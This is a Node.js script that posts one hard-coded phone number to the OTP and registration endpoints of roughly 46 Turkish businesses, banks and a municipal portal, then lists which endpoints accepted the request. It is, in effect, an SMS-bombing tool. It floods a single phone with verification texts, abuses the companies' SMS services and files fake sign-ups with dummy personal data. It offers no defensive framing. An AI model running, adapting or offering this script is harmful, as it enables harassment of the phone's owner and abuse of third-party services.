import axios from 'axios';
const ph = '5343622375';

const ALL = [
  {id:'kahve_dunyasi', url:'https://api.kahvedunyasi.com/api/v1/auth/account/register/phone-number', p:{countryCode:'90',phoneNumber:ph}},
  {id:'wmf', url:'https://www.wmf.com.tr/users/register/', p:{phone:'0'+ph,first_name:'Test',last_name:'Test',email:'t@t.com',password:'T123456!',confirm:true,date_of_birth:'1990-01-01'}},
  {id:'evidea', url:'https://www.evidea.com/users/register/', p:{phone:'0'+ph,first_name:'Test',last_name:'Test',email:'t@t.com',password:'T123456!',confirm:true}},
  {id:'dr', url:'https://www.dr.com.tr/api/member/sendOtp', p:{phone:ph}},
  {id:'file_market', url:'https://api.filemarket.com.tr/v1/otp/send', p:{mobilePhoneNumber:'90'+ph}},
  {id:'yapp', url:'https://yapp.com.tr/api/mobile/v1/register', p:{phone_number:ph,email:'t@t.com',firstname:'T',lastname:'T'}},
  {id:'suiste', url:'https://suiste.com/api/auth/code', p:{gsm:ph,action:'register'}},
  {id:'fatih_belediye', url:'https://ebelediye.fatih.bel.tr/Sicil/KisiUyelikKaydet', p:{SahisUyelik_CepTelefonu:'0'+ph,TC:'12345678901',Ad:'T',Soyad:'T',EPosta:'t@t.com',Sifre:'T123456!'}},
  {id:'bkm_express', url:'https://www.bkmexpress.com.tr/api/v1/otp/send', p:{phone:'90'+ph}},
  {id:'shopandfly', url:'https://www.shopandfly.com.tr/api/v1/otp/send', p:{phone:'90'+ph}},
  {id:'teb', url:'https://www.teb.com.tr/api/v1/otp/send', p:{phone:'90'+ph}},
  {id:'hayat_su', url:'https://api.hayatsu.com.tr/api/SignUp/SendOtp', p:{mobilePhoneNumber:ph,actionType:'register'}},
  {id:'qumpara', url:'https://tr-api.fisicek.com/v1.3/auth/getOTP', p:{msisdn:'+90'+ph}},
  {id:'beefull', url:'https://app.beefull.io/api/inavitas-access-management/sms-login', p:{phoneCode:'90',phoneNumber:ph,tenant:'beefull'}},
  {id:'migros', url:'https://www.migros.com.tr/rest/auth/register/send-otp', p:{phoneNumber:'90'+ph}},
  {id:'bim', url:'https://bim.com.tr/api/v1/user/register/otp', p:{phone:'90'+ph}},
  {id:'kuryem_gelsin', url:'https://api.kuryemgelsin.com/api/v1/auth/otp/send', p:{phone:'90'+ph}},
  {id:'marti', url:'https://api.marti.tech/api/v2/auth/otp/send', p:{phoneNumber:'+90'+ph}},
  {id:'hamidiye', url:'https://api.hamidiyesu.com.tr/api/auth/register/otp', p:{phone:ph}},
  {id:'paybol', url:'https://api.paybol.com/api/v1/auth/otp/send', p:{phone:'90'+ph}},
  {id:'kitapyurdu', url:'https://www.kitapyurdu.com/index.php?route=account/register/sendOtp', p:{telephone:'0'+ph,firstname:'T',lastname:'T',email:'t@t.com',password:'T123456!'}},
  {id:'e_bebek', url:'https://www.e-bebek.com/api/v1/auth/register/send-otp', p:{phone:ph,email:'t@t.com'}},
  {id:'gamegaraj', url:'https://www.gamegaraj.com/api/v1/auth/register/sendOtp', p:{phone:ph,email:'t@t.com'}},
  {id:'ipragaz', url:'https://api.ipragaz.com.tr/api/v1/auth/register/sendOtp', p:{phoneNumber:ph}},
  {id:'tikla_gelsin', url:'https://api.tiklagelsin.com/api/v1/auth/otp/send', p:{phone:ph}},
  {id:'onur_market', url:'https://www.onurmarket.com/api/v1/auth/register/sendOtp', p:{phone:ph}},
  {id:'happy_center', url:'https://www.happycenter.com.tr/api/v1/auth/register/sendOtp', p:{phone:ph}},
  {id:'oriflame', url:'https://www.oriflame.com.tr/api/v1/auth/register/send-otp', p:{phone:'+90'+ph}},
  {id:'dominos', url:'https://api.dominos.com.tr/api/v1/auth/otp/send', p:{phone:ph,countryCode:'90'}},
  {id:'komagene', url:'https://api.komagene.com.tr/api/v1/auth/send-otp', p:{phone:ph}},
  {id:'english_home', url:'https://www.englishhome.com/api/member/register/send-code', p:{phone:'0'+ph,email:'t@t.com',firstName:'T',lastName:'T'}},
  {id:'joker', url:'https://www.joker.com.tr/api/auth/otp/send', p:{phone:ph}},
  {id:'penti', url:'https://www.penti.com/api/member/register/sendOtp', p:{phone:'0'+ph,email:'t@t.com'}},
  {id:'cineverse', url:'https://api.cineverse.com.tr/api/v1/auth/register/otp', p:{phoneNumber:ph}},
  {id:'macrocenter', url:'https://www.macrocenter.com.tr/rest/auth/register/send-otp', p:{phoneNumber:'90'+ph}},
  {id:'jimmy_key', url:'https://www.jimmykey.com/api/member/register/sendOtp', p:{phone:'0'+ph,email:'t@t.com'}},
  {id:'alix_avien', url:'https://www.alixavien.com.tr/api/member/register/sendOtp', p:{phone:'0'+ph}},
  {id:'bkm_kitap', url:'https://www.bkmkitap.com/api/member/register/sendOtp', p:{phone:'0'+ph,email:'t@t.com'}},
  {id:'mothercare', url:'https://www.mothercare.com.tr/api/member/register/sendOtp', p:{phone:'0'+ph}},
  {id:'toyzz_shop', url:'https://www.toyzzshop.com/api/member/register/sendOtp', p:{phone:'0'+ph,email:'t@t.com'}},
  {id:'sportive', url:'https://www.sportive.com.tr/api/v1/auth/register/send-otp', p:{phone:ph}},
  {id:'intersport', url:'https://www.intersport.com.tr/api/v1/auth/register/sendOtp', p:{phone:ph}},
  {id:'itopya', url:'https://www.itopya.com/api/v1/auth/register/sendOtp', p:{phone:ph}},
  {id:'vatan_bilgisayar', url:'https://www.vatanbilgisayar.com/api/v1/auth/register/sendOtp', p:{phone:ph,email:'t@t.com'}},
  {id:'lr', url:'https://www.lrworld.com/tr/api/auth/register/send-otp', p:{phone:'+90'+ph,country:'TR'}},
  {id:'amway', url:'https://www.amway.com.tr/api/v1/auth/register/send-otp', p:{phone:'+90'+ph,locale:'tr_TR'}},
];

console.log('=== MASS TEST OF ALL ENDPOINTS ===\n');
let working = [];

for (const t of ALL) {
  process.stdout.write(t.id.padEnd(20));
  try {
    const r = await axios.post(t.url, t.p, {timeout:8000, headers:{'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36','Content-Type':'application/json'}, validateStatus:()=>true});
    if (r.status >= 200 && r.status < 400) {
      const body = JSON.stringify(r.data).substring(0,100);
      console.log('✅ ' + r.status + ' ' + body);
      working.push(t.id);
    } else if (r.status === 429 || r.status === 400) {
      const body = JSON.stringify(r.data).substring(0,100);
      console.log('  ' + r.status + ' ' + body);
      if (r.status === 400) working.push(t.id + '(400)');
    } else {
      console.log('  ' + r.status);
    }
  } catch(e) {
    console.log('  ERR ' + (e.code||e.message.substring(0,40)));
  }
}

console.log('\n\n=== WORKING ENDPOINTS ===');
working.forEach(w => console.log('  ✅ ' + w));
console.log('\nTotal working: ' + working.length + '/' + ALL.length);
